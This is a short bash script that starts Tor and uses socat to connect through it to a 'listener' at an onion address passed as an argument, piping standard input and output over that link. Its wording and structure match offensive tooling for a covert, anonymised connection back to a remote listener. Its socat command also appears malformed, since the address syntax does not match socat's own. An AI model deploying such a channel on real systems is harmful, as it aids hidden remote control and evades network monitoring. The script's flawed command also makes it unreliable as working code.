#!/bin/bash

# Set the Onion address passed as an argument
LISTENER_ONION_ADDRESS=$1

# Check if the Onion address is provided
if [ -z "$LISTENER_ONION_ADDRESS" ]; then
  echo "[-] Error: Listener Onion address not provided." >&2
  exit 1
fi

# Configure Tor to route the traffic
echo "[+] Configuring Tor to connect to the listener..."

# Start Tor and allow some time to initialize
echo "[+] Starting Tor service..."
tor &

# Allow Tor some time to initialize
sleep 20

# Echo that Tor has started
echo "[+] Tor service started successfully."

# Connect to the listener over the Tor network
echo "[+] Attempting connection to the listener at $LISTENER_ONION_ADDRESS..."
socat TCP4:127.0.0.1:9050,proxyconnect=SOCKS4A:$LISTENER_ONION_ADDRESS:80 STDIO
